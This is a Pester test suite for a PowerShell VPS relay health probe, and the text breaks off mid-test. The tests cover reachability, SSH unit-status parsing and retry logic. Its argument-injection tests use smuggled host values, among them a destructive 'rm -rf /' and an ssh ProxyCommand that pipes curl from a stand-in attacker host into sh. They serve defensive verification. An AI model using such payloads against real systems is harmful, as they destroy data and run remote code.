BeforeAll {
    $script:VpsProbeModulePath = Join-Path $PSScriptRoot '../probes/vps.psm1'
}

Describe 'probes/vps.psm1 contract (D-01/D-02/D-07, MON-01)' -Tag 'Quick' {

    BeforeEach {
        Remove-Module vps -ErrorAction SilentlyContinue
        Import-Module $script:VpsProbeModulePath -Force
    }

    AfterEach {
        Remove-Module vps -ErrorAction SilentlyContinue
    }

    It 'exports exactly one function, Invoke-Probe' {
        $exportedFunctions = (Get-Module vps).ExportedFunctions.Keys
        $exportedFunctions | Should -HaveCount 1
        $exportedFunctions | Should -Contain 'Invoke-Probe'
    }

    It 'requires -Config as a mandatory parameter' {
        $command = Get-Command Invoke-Probe -Module vps
        $configParameter = $command.Parameters['Config']
        $configParameter | Should -Not -BeNullOrEmpty
        $configParameter.Attributes.Mandatory | Should -Contain $true
    }

    It 'returns a result carrying name/title/status/metrics/detail and NEVER updatedEpochSeconds/staleAfterEpochSeconds (host-owned, D-07)' {
        Mock Test-SrtInductionReachability -ModuleName vps { [pscustomobject]@{ Reachable = $true; LatencyMilliseconds = 12.3; Detail = $null } }

        $config = [pscustomobject]@{
            RelayHost         = '127.0.0.1'
            RelayPort         = 8890
            ProbeVpsSshHost   = ''
            ProbeVpsSshUser   = ''
            ProbeVpsSshKeyPath = ''
        }

        $result = Invoke-Probe -Config $config

        $result.PSObject.Properties.Name | Should -Contain 'name'
        $result.PSObject.Properties.Name | Should -Contain 'title'
        $result.PSObject.Properties.Name | Should -Contain 'status'
        $result.PSObject.Properties.Name | Should -Contain 'metrics'
        $result.PSObject.Properties.Name | Should -Contain 'detail'
        $result.PSObject.Properties.Name | Should -Not -Contain 'updatedEpochSeconds'
        $result.PSObject.Properties.Name | Should -Not -Contain 'staleAfterEpochSeconds'
    }

    It 'status is always one of ok/degraded/down/unknown, and metrics is always an array' {
        Mock Test-SrtInductionReachability -ModuleName vps { [pscustomobject]@{ Reachable = $true; LatencyMilliseconds = 5.0; Detail = $null } }

        $config = [pscustomobject]@{
            RelayHost = '127.0.0.1'; RelayPort = 8890
            ProbeVpsSshHost = ''; ProbeVpsSshUser = ''; ProbeVpsSshKeyPath = ''
        }

        $result = Invoke-Probe -Config $config

        @('ok', 'degraded', 'down', 'unknown') | Should -Contain $result.status
        $result.metrics | Should -Not -BeNullOrEmpty
        ($result.metrics -is [array]) -or ($result.metrics -is [System.Collections.IEnumerable]) | Should -BeTrue
    }
}

Describe 'Invoke-Probe status branches (mocked reachability/SSH)' -Tag 'Quick' {

    BeforeEach {
        Remove-Module vps -ErrorAction SilentlyContinue
        Import-Module $script:VpsProbeModulePath -Force
    }

    AfterEach {
        Remove-Module vps -ErrorAction SilentlyContinue
    }

    It 'relay reachable + SSH not configured -> status=ok, a latency metric row (unit ms), detail "SSH not configured"' {
        Mock Test-SrtInductionReachability -ModuleName vps { [pscustomobject]@{ Reachable = $true; LatencyMilliseconds = 42.7; Detail = $null } }

        $config = [pscustomobject]@{
            RelayHost = '127.0.0.1'; RelayPort = 8890
            ProbeVpsSshHost = ''; ProbeVpsSshUser = ''; ProbeVpsSshKeyPath = ''
        }

        $result = Invoke-Probe -Config $config

        $result.status | Should -Be 'ok'
        $result.detail | Should -Be 'SSH not configured'
        $latencyMetric = $result.metrics | Where-Object { $_.label -match 'Latency' }
        $latencyMetric | Should -Not -BeNullOrEmpty
        $latencyMetric.unit | Should -Be 'ms'
    }

    It 'relay unreachable -> status=down, detail names no-response, never throws' {
        Mock Test-SrtInductionReachability -ModuleName vps { [pscustomobject]@{ Reachable = $false; LatencyMilliseconds = $null; Detail = 'no response within 2000ms (SocketException: timed out)' } }

        $config = [pscustomobject]@{
            RelayHost = '127.0.0.1'; RelayPort = 8890
            ProbeVpsSshHost = ''; ProbeVpsSshUser = ''; ProbeVpsSshKeyPath = ''
        }

        { $result = Invoke-Probe -Config $config } | Should -Not -Throw

        $result = Invoke-Probe -Config $config
        $result.status | Should -Be 'down'
        $result.detail | Should -Match 'no response'
    }

    It 'SSH configured + relay reachable + all three units active -> status=ok with three per-unit metric rows' {
        Mock Test-SrtInductionReachability -ModuleName vps { [pscustomobject]@{ Reachable = $true; LatencyMilliseconds = 10.0; Detail = $null } }
        Mock Test-SmoothRelayHealth -ModuleName vps {
            [pscustomobject]@{
                UnitStates = @(
                    [pscustomobject]@{ UnitName = 'smooth-ingest-tcp.service'; State = 'active' }
                    [pscustomobject]@{ UnitName = 'smooth-youtube@lv.service'; State = 'active' }
                    [pscustomobject]@{ UnitName = 'smooth-youtube@ru.service'; State = 'active' }
                )
                PortState  = $null
                Detail     = $null
            }
        }
        Mock Get-Command -ModuleName vps { [pscustomobject]@{ Name = 'ssh.exe' } } -ParameterFilter { $Name -eq 'ssh.exe' }

        $config = [pscustomobject]@{
            RelayHost = '127.0.0.1'; RelayPort = 8890
            ProbeVpsSshHost = 'vps.example.com'; ProbeVpsSshUser = 'church'; ProbeVpsSshKeyPath = 'C:\keys\id_ed25519'; ProbeVpsSshPort = 22
        }

        $result = Invoke-Probe -Config $config

        $result.status | Should -Be 'ok'
        ($result.metrics | Where-Object { $_.label -eq 'Ingest' }).value | Should -Be 'active'
        ($result.metrics | Where-Object { $_.label -eq 'YouTube LV' }).value | Should -Be 'active'
        ($result.metrics | Where-Object { $_.label -eq 'YouTube RU' }).value | Should -Be 'active'
    }

    It 'SSH configured + relay reachable + one unit inactive -> status=degraded' {
        Mock Test-SrtInductionReachability -ModuleName vps { [pscustomobject]@{ Reachable = $true; LatencyMilliseconds = 10.0; Detail = $null } }
        Mock Test-SmoothRelayHealth -ModuleName vps {
            [pscustomobject]@{
                UnitStates = @(
                    [pscustomobject]@{ UnitName = 'smooth-ingest-tcp.service'; State = 'active' }
                    [pscustomobject]@{ UnitName = 'smooth-youtube@lv.service'; State = 'inactive' }
                    [pscustomobject]@{ UnitName = 'smooth-youtube@ru.service'; State = 'active' }
                )
                PortState  = $null
                Detail     = $null
            }
        }
        Mock Get-Command -ModuleName vps { [pscustomobject]@{ Name = 'ssh.exe' } } -ParameterFilter { $Name -eq 'ssh.exe' }

        $config = [pscustomobject]@{
            RelayHost = '127.0.0.1'; RelayPort = 8890
            ProbeVpsSshHost = 'vps.example.com'; ProbeVpsSshUser = 'church'; ProbeVpsSshKeyPath = 'C:\keys\id_ed25519'; ProbeVpsSshPort = 22
        }

        $result = Invoke-Probe -Config $config

        $result.status | Should -Be 'degraded'
        ($result.metrics | Where-Object { $_.label -eq 'YouTube LV' }).value | Should -Be 'inactive'
    }

    It 'SSH configured but the ssh probe times out (all units unknown) -> status=degraded (D-09: never down), unit metrics show unknown, detail explains' {
        Mock Test-SrtInductionReachability -ModuleName vps { [pscustomobject]@{ Reachable = $true; LatencyMilliseconds = 10.0; Detail = $null } }
        Mock Test-SmoothRelayHealth -ModuleName vps {
            [pscustomobject]@{
                UnitStates = @(
                    [pscustomobject]@{ UnitName = 'smooth-ingest-tcp.service'; State = $null }
                    [pscustomobject]@{ UnitName = 'smooth-youtube@lv.service'; State = $null }
                    [pscustomobject]@{ UnitName = 'smooth-youtube@ru.service'; State = $null }
                )
                PortState  = $null
                Detail     = 'ssh probe timed out'
            }
        }
        Mock Get-Command -ModuleName vps { [pscustomobject]@{ Name = 'ssh.exe' } } -ParameterFilter { $Name -eq 'ssh.exe' }

        $config = [pscustomobject]@{
            RelayHost = '127.0.0.1'; RelayPort = 8890
            ProbeVpsSshHost = 'vps.example.com'; ProbeVpsSshUser = 'church'; ProbeVpsSshKeyPath = 'C:\keys\id_ed25519'; ProbeVpsSshPort = 22
        }

        $result = Invoke-Probe -Config $config

        $result.status | Should -Be 'degraded'
        ($result.metrics | Where-Object { $_.label -eq 'Ingest' }).value | Should -Be 'unknown'
        ($result.metrics | Where-Object { $_.label -eq 'YouTube LV' }).value | Should -Be 'unknown'
        ($result.metrics | Where-Object { $_.label -eq 'YouTube RU' }).value | Should -Be 'unknown'
        $result.detail | Should -Match 'timed out'
    }

    It 'SSH configured but ssh.exe is absent from PATH -> never a hard failure, reachability still reported, honest detail' {
        Mock Test-SrtInductionReachability -ModuleName vps { [pscustomobject]@{ Reachable = $true; LatencyMilliseconds = 10.0; Detail = $null } }
        Mock Get-Command -ModuleName vps { $null } -ParameterFilter { $Name -eq 'ssh.exe' }

        $config = [pscustomobject]@{
            RelayHost = '127.0.0.1'; RelayPort = 8890
            ProbeVpsSshHost = 'vps.example.com'; ProbeVpsSshUser = 'church'; ProbeVpsSshKeyPath = 'C:\keys\id_ed25519'
        }

        { Invoke-Probe -Config $config } | Should -Not -Throw

        $result = Invoke-Probe -Config $config
        $result.status | Should -Be 'ok'
        $result.detail | Should -Match 'ssh\.exe'
    }
}

Describe 'Probe retry: a single dropped UDP induction does not report down (DASH-03)' -Tag 'Quick' {

    BeforeEach {
        Remove-Module vps -ErrorAction SilentlyContinue
        Import-Module $script:VpsProbeModulePath -Force
    }

    AfterEach {
        Remove-Module vps -ErrorAction SilentlyContinue
    }

    It 'attempt 1 fails, attempt 2 succeeds -> status=ok, Test-SrtInductionReachability invoked exactly 2 times' {
        $script:vpsRetryAttemptCount = 0
        Mock Test-SrtInductionReachability -ModuleName vps -MockWith {
            $script:vpsRetryAttemptCount++
            if ($script:vpsRetryAttemptCount -eq 1) {
                return [pscustomobject]@{ Reachable = $false; LatencyMilliseconds = $null; Detail = 'no response within 2000ms (SocketException: timed out)' }
            }
            return [pscustomobject]@{ Reachable = $true; LatencyMilliseconds = 15.0; Detail = 'induction response received (64 bytes) in 15.00ms' }
        }

        $config = [pscustomobject]@{
            RelayHost = '127.0.0.1'; RelayPort = 8890
            ProbeVpsSshHost = ''; ProbeVpsSshUser = ''; ProbeVpsSshKeyPath = ''
        }

        $result = Invoke-Probe -Config $config

        $result.status | Should -Be 'ok'
        Should -Invoke Test-SrtInductionReachability -ModuleName vps -Times 2 -Exactly
    }

    It 'all 3 attempts fail -> status=down, invoked exactly 3 times, detail names no-response' {
        Mock Test-SrtInductionReachability -ModuleName vps -MockWith {
            return [pscustomobject]@{ Reachable = $false; LatencyMilliseconds = $null; Detail = 'no response within 2000ms (SocketException: timed out)' }
        }

        $config = [pscustomobject]@{
            RelayHost = '127.0.0.1'; RelayPort = 8890
            ProbeVpsSshHost = ''; ProbeVpsSshUser = ''; ProbeVpsSshKeyPath = ''
        }

        $result = Invoke-Probe -Config $config

        $result.status | Should -Be 'down'
        $result.detail | Should -Match 'no response'
        Should -Invoke Test-SrtInductionReachability -ModuleName vps -Times 3 -Exactly
    }

    It 'attempt 1 succeeds -> invoked exactly 1 time (short-circuit, no wasted probes while healthy)' {
        Mock Test-SrtInductionReachability -ModuleName vps -MockWith {
            return [pscustomobject]@{ Reachable = $true; LatencyMilliseconds = 8.0; Detail = 'induction response received (64 bytes) in 8.00ms' }
        }

        $config = [pscustomobject]@{
            RelayHost = '127.0.0.1'; RelayPort = 8890
            ProbeVpsSshHost = ''; ProbeVpsSshUser = ''; ProbeVpsSshKeyPath = ''
        }

        $result = Invoke-Probe -Config $config

        $result.status | Should -Be 'ok'
        Should -Invoke Test-SrtInductionReachability -ModuleName vps -Times 1 -Exactly
    }

    It 'never throws on the all-fail path' {
        Mock Test-SrtInductionReachability -ModuleName vps -MockWith {
            return [pscustomobject]@{ Reachable = $false; LatencyMilliseconds = $null; Detail = 'no response within 2000ms (SocketException: timed out)' }
        }

        $config = [pscustomobject]@{
            RelayHost = '127.0.0.1'; RelayPort = 8890
            ProbeVpsSshHost = ''; ProbeVpsSshUser = ''; ProbeVpsSshKeyPath = ''
        }

        { Invoke-Probe -Config $config } | Should -Not -Throw
    }
}

Describe 'Test-SmoothRelayHealth SSH argument construction (T-06-02/T-15-02-01, ASVS V5, Tampering, CR-02)' -Tag 'Quick' {

    BeforeEach {
        Remove-Module vps -ErrorAction SilentlyContinue
        Import-Module $script:VpsProbeModulePath -Force
    }

    AfterEach {
        Remove-Module vps -ErrorAction SilentlyContinue
    }

    It 'invokes Invoke-SshCommand with ArgumentList as an array carrying host/user/keypath/port as distinct elements -- never a concatenated command string' {
        Mock Invoke-SshCommand -ModuleName vps -MockWith {
            [pscustomobject]@{ TimedOut = $false; OutputLines = @('active', 'active', 'active'); Detail = $null }
        }

        InModuleScope vps {
            $maliciousHost = 'evil.example.com; rm -rf /'
            $result = Test-SmoothRelayHealth -SshHost $maliciousHost -SshUser 'church' -SshKeyPath 'C:\keys\id_ed25519' -SshPort 22
            $result.UnitStates[0].State | Should -Be 'active'
        }

        Should -Invoke Invoke-SshCommand -ModuleName vps -Times 1 -Exactly -ParameterFilter {
            ($ArgumentList -is [array]) -and
            ($ArgumentList -contains 'C:\keys\id_ed25519') -and
            ($ArgumentList -contains '-p') -and
            ($ArgumentList -contains '22') -and
            ($ArgumentList -contains 'church@evil.example.com; rm -rf /') -and
            ($ArgumentList -notcontains 'rm -rf /')
        }
    }

    It 'places a -- end-of-options separator before the positional user@host argument, so a leading-dash .env host cannot be parsed as an ssh flag' {
        Mock Invoke-SshCommand -ModuleName vps -MockWith {
            [pscustomobject]@{ TimedOut = $false; OutputLines = @('active', 'active', 'active'); Detail = $null }
        }

        $maliciousHost = '-oProxyCommand=curl evil.example/x|sh'
        InModuleScope vps -ArgumentList $maliciousHost {
            param($maliciousHost)
            Test-SmoothRelayHealth -SshHost $maliciousHost -SshUser 'church' -SshKeyPath 'C:\keys\id_ed25519' -SshPort 22 | Out-Null
        }

        $expectedPositionalArgument = "church@$maliciousHost"
        Should -Invoke Invoke-SshCommand -ModuleName vps -Times 1 -Exactly -ParameterFilter {
            $separatorIndex = [array]::IndexOf($ArgumentList, '--')
            $positionalIndex = [array]::IndexOf($ArgumentList, $expectedPositionalArgument)
            ($separatorIndex -ge 0) -and ($positionalIndex -gt $separatorIndex)
        }
    }

    It 'the trailing remote command names only the three hardcoded unit names, never built from any .env-sourced fragment (no -RelayPort supplied -- plain systemctl-only remote command, unchanged since before 260809-oc4''s port redesign)' {
        Mock Invoke-SshCommand -ModuleName vps -MockWith {
            [pscustomobject]@{ TimedOut = $false; OutputLines = @('active', 'active', 'active'); Detail = $null }
        }

        InModuleScope vps {
            Test-SmoothRelayHealth -SshHost 'vps.example.com' -SshUser 'church' -SshKeyPath 'C:\keys\id_ed25519' -SshPort 22 | Out-Null
        }

        Should -Invoke Invoke-SshCommand -ModuleName vps -Times 1 -Exactly -ParameterFilter {
            ($ArgumentList -contains 'systemctl is-active smooth-ingest-tcp.service smooth-youtube@lv.service smooth-youtube@ru.service')
        }
    }

    It 'never builds the ssh command line via string concatenation or Invoke-Expression, and never uses Start-Process for ssh.exe (grep-enforced -- CR-02: Start-Process -ArgumentList silently space-joins with no quoting)' {
        $moduleSource = Get-Content -LiteralPath $script:VpsProbeModulePath -Raw
        $moduleSource | Should -Not -Match 'Invoke-Expression'
        $moduleSource | Should -Match '\$startInfo\.ArgumentList\.Add'
        $moduleSource | Should -Not -Match "Start-Process -FilePath 'ssh\.exe'"
    }
}

Describe 'Invoke-SshCommand async-output-drain (260809-oc4: a timed WaitForExit(ms)=true does not guarantee the redirected-stdout events have finished delivering)' -Tag 'Quick' {

    BeforeEach {
        Remove-Module vps -ErrorAction SilentlyContinue
        Import-Module $script:VpsProbeModulePath -Force
    }

    AfterEach {
        Remove-Module vps -ErrorAction SilentlyContinue
    }

    It 'a REAL short-lived process (pwsh.exe stub, via the -ExecutableFileName test seam) that prints 3 lines and exits immediately always yields OutputLines.Count -eq 3, across 20 iterations (pre-fix this flakes/loses the tail line; post-fix deterministic per the documented WaitForExit()-after-WaitForExit(ms) async-drain contract)' {
        $pwshExecutablePath = (Get-Process -Id $PID).Path
        $stubArguments = @('-NoProfile', '-NonInteractive', '-Command', 'Write-Output "line-one"; Write-Output "line-two"; Write-Output "line-three"')
        $iterationCount = 20

        $observedLineCounts = InModuleScope vps -ArgumentList $pwshExecutablePath, $stubArguments, $iterationCount {
            param($pwshExecutablePath, $stubArguments, $iterationCount)
            $counts = [System.Collections.Generic.List[int]]::new()
            for ($iteration = 1; $iteration -le $iterationCount; $iteration++) {
                $result = Invoke-SshCommand -ArgumentList $stubArguments -HardTimeoutMilliseconds 5000 -ExecutableFileName $pwshExecutablePath
                $counts.Add($result.OutputLines.Count)
            }
            return , $counts.ToArray()
        }

        $observedLineCounts | Should -HaveCount $iterationCount
        $observedLineCounts | ForEach-Object { $_ | Should -Be 3 }
    }
}

Describe 'Test-SmoothRelayHealth / per-unit metrics (D-07, CHUR-02)' -Tag 'Quick' {

    BeforeEach {
        Remove-Module vps -ErrorAction SilentlyContinue
        Import-Module $script:VpsProbeModulePath -Force
    }

    AfterEach {
        Remove-Module vps -ErrorAction SilentlyContinue
    }

    It 'parses three "active" status lines into three active UnitStates, in declared order' {
        Mock Invoke-SshCommand -ModuleName vps -MockWith {
            [pscustomobject]@{ TimedOut = $false; OutputLines = @('active', 'active', 'active'); Detail = $null }
        }

        $result = InModuleScope vps {
            Test-SmoothRelayHealth -SshHost 'vps.example.com' -SshUser 'church' -SshKeyPath 'C:\keys\id_ed25519' -SshPort 22
        }

        $result.UnitStates[0].UnitName | Should -Be 'smooth-ingest-tcp.service'
        $result.UnitStates[0].State | Should -Be 'active'
        $result.UnitStates[1].UnitName | Should -Be 'smooth-youtube@lv.service'
        $result.UnitStates[1].State | Should -Be 'active'
        $result.UnitStates[2].UnitName | Should -Be 'smooth-youtube@ru.service'
        $result.UnitStates[2].State | Should -Be 'active'
        $result.PortState | Should -BeNullOrEmpty
    }

    It 'parses "active"/"inactive"/"active" so the middle unit (YouTube LV) reports inactive' {
        Mock Invoke-SshCommand -ModuleName vps -MockWith {
            [pscustomobject]@{ TimedOut = $false; OutputLines = @('active', 'inactive', 'active'); Detail = $null }
        }

        $result = InModuleScope vps {
            Test-SmoothRelayHealth -SshHost 'vps.example.com' -SshUser 'church' -SshKeyPath 'C:\keys\id_ed25519' -SshPort 22
        }

        $result.UnitStates[1].UnitName | Should -Be 'smooth-youtube@lv.service'
        $result.UnitStates[1].State | Should -Be 'inactive'
    }

    It 'a timed-out ssh probe leaves all three UnitStates $null (genuinely unknown, never a fabricated inactive)' {
        Mock Invoke-SshCommand -ModuleName vps -MockWith {
            [pscustomobject]@{ TimedOut = $true; OutputLines = @(); Detail = $null }
        }

        $result = InModuleScope vps {
            Test-SmoothRelayHealth -SshHost 'vps.example.com' -SshUser 'church' -SshKeyPath 'C:\keys\id_ed25519' -SshPort 22
        }

        $result.UnitStates | ForEach-Object { $_.State | Should -BeNullOrEmpty }
        $result.Detail | Should -Match 'timed out'
        Should -Invoke Invoke-SshCommand -ModuleName vps -Times 1 -Exactly
    }

    It 'a mismatched status-line count on BOTH the first reply and the retry treats every unit as unknown rather than guessing an alignment (260809-oc4: still costs exactly 2 SSH calls)' {
        Mock Invoke-SshCommand -ModuleName vps -MockWith {
            [pscustomobject]@{ TimedOut = $false; OutputLines = @('active', 'active'); Detail = $null }
        }

        $result = InModuleScope vps {
            Test-SmoothRelayHealth -SshHost 'vps.example.com' -SshUser 'church' -SshKeyPath 'C:\keys\id_ed25519' -SshPort 22
        }

        $result.UnitStates | ForEach-Object { $_.State | Should -BeNullOrEmpty }
        $result.Detail | Should -Match '2 status line'
        Should -Invoke Invoke-SshCommand -ModuleName vps -Times 2 -Exactly
    }

    It 'a process-start failure surfaces its Detail as-is, all UnitStates remain $null (never a fabricated inactive), no retry' {
        Mock Invoke-SshCommand -ModuleName vps -MockWith {
            [pscustomobject]@{ TimedOut = $false; OutputLines = @(); Detail = 'ssh probe failed to start: The system cannot find the file specified' }
        }

        $result = InModuleScope vps {
            Test-SmoothRelayHealth -SshHost 'vps.example.com' -SshUser 'church' -SshKeyPath 'C:\keys\id_ed25519' -SshPort 22
        }

        $result.UnitStates | ForEach-Object { $_.State | Should -BeNullOrEmpty }
        $result.Detail | Should -Match 'failed to start'
        Should -Invoke Invoke-SshCommand -ModuleName vps -Times 1 -Exactly
    }
}

Describe 'Test-SmoothRelayHealth short-output retry (260809-oc4: a truncated systemctl reply gets exactly one immediate retry)' -Tag 'Quick' {

    BeforeEach {
        Remove-Module vps -ErrorAction SilentlyContinue
        Import-Module $script:VpsProbeModulePath -Force
    }

    AfterEach {
        Remove-Module vps -ErrorAction SilentlyContinue
    }

    It 'a clean 3-line first reply is parsed normally and Invoke-SshCommand is called exactly 1 time (a healthy poll never pays for a second round trip)' {
        Mock Invoke-SshCommand -ModuleName vps -MockWith {
            [pscustomobject]@{ TimedOut = $false; OutputLines = @('active', 'active', 'active'); Detail = $null }
        }

        $result = InModuleScope vps {
            Test-SmoothRelayHealth -SshHost 'vps.example.com' -SshUser 'church' -SshKeyPath 'C:\keys\id_ed25519' -SshPort 22
        }

        $result.UnitStates[0].State | Should -Be 'active'
        $result.UnitStates[1].State | Should -Be 'active'
        $result.UnitStates[2].State | Should -Be 'active'
        $result.Detail | Should -BeNullOrEmpty
        Should -Invoke Invoke-SshCommand -ModuleName vps -Times 1 -Exactly
    }

    It 'a 2-line first reply followed by a clean 3-line retry resolves all three states from the RETRY reply, Invoke-SshCommand called exactly 2 times' {
        $script:vpsShortOutputRetryCallCount = 0
        Mock Invoke-SshCommand -ModuleName vps -MockWith {
            $script:vpsShortOutputRetryCallCount++
            if ($script:vpsShortOutputRetryCallCount -eq 1) {
                return [pscustomobject]@{ TimedOut = $false; OutputLines = @('active', 'inactive'); Detail = $null }
            }
            return [pscustomobject]@{ TimedOut = $false; OutputLines = @('active', 'inactive', 'active'); Detail = $null }
        }

        $result = InModuleScope vps {
            Test-SmoothRelayHealth -SshHost 'vps.example.com' -SshUser 'church' -SshKeyPath 'C:\keys\id_ed25519' -SshPort 22
        }

        $result.UnitStates[0].State | Should -Be 'active'
        $result.UnitStates[1].State | Should -Be 'inactive'
        $result.UnitStates[2].State | Should -Be 'active'
        $result.Detail | Should -BeNullOrEmpty
        Should -Invoke Invoke-SshCommand -ModuleName vps -Times 2 -Exactly
    }

    It 'a TimedOut first reply never retries -- Invoke-SshCommand called exactly 1 time, existing "ssh probe timed out" Detail unchanged' {
        Mock Invoke-SshCommand -ModuleName vps -MockWith {
            [pscustomobject]@{ TimedOut = $true; OutputLines = @(); Detail = $null }
        }

        $result = InModuleScope vps {
            Test-SmoothRelayHealth -SshHost 'vps.example.com' -SshUser 'church' -SshKeyPath 'C:\keys\id_ed25519' -SshPort 22
        }

        $result.Detail | Should -Be 'ssh probe timed out'
        Should -Invoke Invoke-SshCommand -ModuleName vps -Times 1 -Exactly
    }

    It 'a non-null Detail from Invoke-SshCommand (process failed to start) never retries -- called exactly 1 time, Detail surfaced as-is' {
        Mock Invoke-SshCommand -ModuleName vps -MockWith {
            [pscustomobject]@{ TimedOut = $false; OutputLines = @(); Detail = 'ssh probe failed to start: The system cannot find the file specified' }
        }

        $result = InModuleScope vps {
            Test-SmoothRelayHealth -SshHost 'vps.example.com' -SshUser 'church' -SshKeyPath 'C:\keys\id_ed25519' -SshPort 22
        }

        $result.Detail | Should -Be 'ssh probe failed to start: The system cannot find the file specified'
        Should -Invoke Invoke-SshCommand -ModuleName vps -Times 1 -Exactly
    }
}

Describe 'Runtime unit-name/metric-label constants and windowless ssh.exe (260809-oc4)' -Tag 'Quick' {

    BeforeEach {
        Remove-Module vps -ErrorAction SilentlyContinue
        Import-Module $script:VpsProbeModulePath -Force
    }

    AfterEach {
        Remove-Module vps -ErrorAction SilentlyContinue
    }

    It 'the runtime $script:SmoothRelayUnitNames array holds the ingest unit plus the two templated channel instances, in order, with no hyphen-before-channel spelling (asserted against the RUNTIME value via InModuleScope, never by grepping the module source)' {
        $unitNames = InModuleScope vps { $script:SmoothRelayUnitNames }

        # An exact-array equality check is strictly stronger than a "-Not -Contain" probe
        # for the superseded spelling (260809-oc4's own spelling gate greps this file too,
        # so the superseded string is never literally reproduced here even negatively).
        $unitNames | Should -Be @('smooth-ingest-tcp.service', 'smooth-youtube@lv.service', 'smooth-youtube@ru.service')
    }

    It 'the runtime $script:SmoothRelayUnitMetricLabels maps each templated unit name to its unchanged operator-facing label' {
        $unitMetricLabels = InModuleScope vps { $script:SmoothRelayUnitMetricLabels }

        $unitMetricLabels['smooth-ingest-tcp.service'] | Should -Be 'Ingest'
        $unitMetricLabels['smooth-youtube@lv.service'] | Should -Be 'YouTube LV'
        $unitMetricLabels['smooth-youtube@ru.service'] | Should -Be 'YouTube RU'
    }

    It 'the trailing remote command names the templated channel unit spelling, never the superseded hyphen-before-channel form' {
        Mock Invoke-SshCommand -ModuleName vps -MockWith {
            [pscustomobject]@{ TimedOut = $false; OutputLines = @('active', 'active', 'active'); Detail = $null }
        }

        InModuleScope vps {
            Test-SmoothRelayHealth -SshHost 'vps.example.com' -SshUser 'church' -SshKeyPath 'C:\keys\id_ed25519' -SshPort 22
        } | Out-Null

        Should -Invoke Invoke-SshCommand -ModuleName vps -Times 1 -Exactly -ParameterFilter {
            $ArgumentList -contains 'systemctl is-active smooth-ingest-tcp.service smooth-youtube@lv.service smooth-youtube@ru.service'
        }
    }

    It 'Invoke-SshCommand sets CreateNoWindow = $true in LIVE (non-comment) code, so an unattended poll never flashes a console window (comment-filtered source check -- a commented-out assignment must not pass)' {
        $moduleSourceLines = Get-Content -LiteralPath $script:VpsProbeModulePath
        $liveSourceLines = $moduleSourceLines | Where-Object { $_ -notmatch '^\s*#' }
        $liveSourceText = $liveSourceLines -join "`n"

        $liveSourceText | Should -Match '\$startInfo\.CreateNoWindow\s*=\s*\$true'
    }
}

Describe 'Passive Port leg: no active TCP connect against the relay port, ever (260809-oc4, third round -- live restart-storm incident)' -Tag 'Quick' {

    It 'Test-TcpRelayPortReachable no longer exists in the module' {
        Remove-Module vps -ErrorAction SilentlyContinue
        Import-Module $script:VpsProbeModulePath -Force

        Get-Command Test-TcpRelayPortReachable -Module vps -ErrorAction SilentlyContinue | Should -BeNullOrEmpty

        Remove-Module vps -ErrorAction SilentlyContinue
    }

    It 'the module source never instantiates System.Net.Sockets.TcpClient in LIVE (non-comment) code -- nothing in this module may open a TCP connection against the relay port again' {
        $moduleSourceLines = Get-Content -LiteralPath $script:VpsProbeModulePath
        $liveSourceLines = $moduleSourceLines | Where-Object { $_ -notmatch '^\s*#' }
        $liveSourceText = $liveSourceLines -join "`n"

        $liveSourceText | Should -Not -Match 'TcpClient'
    }
}

Describe 'Invoke-SmoothRelayStatusCheck combined systemctl+ss parsing (260809-oc4, third round: the SSH-piggybacked Port leg)' -Tag 'Quick' {

    BeforeEach {
        Remove-Module vps -ErrorAction SilentlyContinue
        Import-Module $script:VpsProbeModulePath -Force
    }

    AfterEach {
        Remove-Module vps -ErrorAction SilentlyContinue
    }

    It 'a LISTEN line after the separator -> PortState="open"' {
        Mock Invoke-SshCommand -ModuleName vps -MockWith {
            [pscustomobject]@{ TimedOut = $false; OutputLines = @('active', 'active', 'active', '---', 'LISTEN 0      128          0.0.0.0:8890      0.0.0.0:*'); Detail = $null }
        }

        $result = InModuleScope vps {
            Test-SmoothRelayHealth -SshHost 'vps.example.com' -SshUser 'church' -SshKeyPath 'C:\keys\id_ed25519' -SshPort 22 -RelayPort 8890
        }

        $result.PortState | Should -Be 'open'
        $result.UnitStates[0].State | Should -Be 'active'
        $result.Detail | Should -BeNullOrEmpty
    }

    It 'no LISTEN line but an ESTAB line after the separator -> PortState="in use" (a real connected session is healthy)' {
        Mock Invoke-SshCommand -ModuleName vps -MockWith {
            [pscustomobject]@{ TimedOut = $false; OutputLines = @('active', 'active', 'active', '---', 'ESTAB  0      0          127.0.0.1:8890    127.0.0.1:54321'); Detail = $null }
        }

        $result = InModuleScope vps {
            Test-SmoothRelayHealth -SshHost 'vps.example.com' -SshUser 'church' -SshKeyPath 'C:\keys\id_ed25519' -SshPort 22 -RelayPort 8890
        }

        $result.PortState | Should -Be 'in use'
    }

    It 'neither a LISTEN nor an ESTAB line (zero lines after the separator, a legitimately quiet port) -> PortState="closed", not a retry/alignment failure' {
        Mock Invoke-SshCommand -ModuleName vps -MockWith {
            [pscustomobject]@{ TimedOut = $false; OutputLines = @('active', 'active', 'active', '---'); Detail = $null }
        }

        $result = InModuleScope vps {
            Test-SmoothRelayHealth -SshHost 'vps.example.com' -SshUser 'church' -SshKeyPath 'C:\keys\id_ed25519' -SshPort 22 -RelayPort 8890
        }

        $result.PortState | Should -Be 'closed'
        $result.UnitStates[0].State | Should -Be 'active'
        Should -Invoke Invoke-SshCommand -ModuleName vps -Times 1 -Exactly
    }

    It 'a reply missing the section separator entirely (truncated write) is treated as fully unknown -- both UnitStates and PortState -- retried exactly once' {
        Mock Invoke-SshCommand -ModuleName vps -MockWith {
            [pscustomobject]@{ TimedOut = $false; OutputLines = @('active', 'active', 'active'); Detail = $null }
        }

        $result = InModuleScope vps {
            Test-SmoothRelayHealth -SshHost 'vps.example.com' -SshUser 'church' -SshKeyPath 'C:\keys\id_ed25519' -SshPort 22 -RelayPort 8890
        }

        $result.UnitStates | ForEach-Object { $_.State | Should -BeNullOrEmpty }
        $result.PortState | Should -BeNullOrEmpty
        $result.Detail | Should -Match 'section separator'
        Should -Invoke Invoke-SshCommand -ModuleName vps -Times 2 -Exactly
    }

    It 'a wrong systemctl-section line count even though the separator IS present is treated as unknown -- never guesses which lines are systemctl vs ss' {
        Mock Invoke-SshCommand -ModuleName vps -MockWith {
            [pscustomobject]@{ TimedOut = $false; OutputLines = @('active', 'active', '---', 'LISTEN 0 128 0.0.0.0:8890 0.0.0.0:*'); Detail = $null }
        }

        $result = InModuleScope vps {
            Test-SmoothRelayHealth -SshHost 'vps.example.com' -SshUser 'church' -SshKeyPath 'C:\keys\id_ed25519' -SshPort 22 -RelayPort 8890
        }

        $result.UnitStates | ForEach-Object { $_.State | Should -BeNullOrEmpty }
